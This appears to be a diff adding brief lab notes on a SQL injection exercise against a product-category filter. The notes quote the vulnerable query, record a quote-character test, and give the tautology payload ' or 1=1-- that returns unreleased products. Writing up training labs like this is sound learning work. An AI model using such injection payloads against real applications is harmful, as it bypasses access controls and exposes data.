@@ -1,0 +1,14 @@
+LAB DESCRIPTION
+ sql vuln in product category
+ app query: SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+GOAL 
+to get all products from all categories , released and unreleased
+
+ANALYSIS
+
+SELECT * FROM products WHERE category = ''' AND released = 1
+-> retrieved the web app but doesn't show any product
+
+To get all products 
+SELECT * FROM products WHERE category = '' or 1 = 1-- 
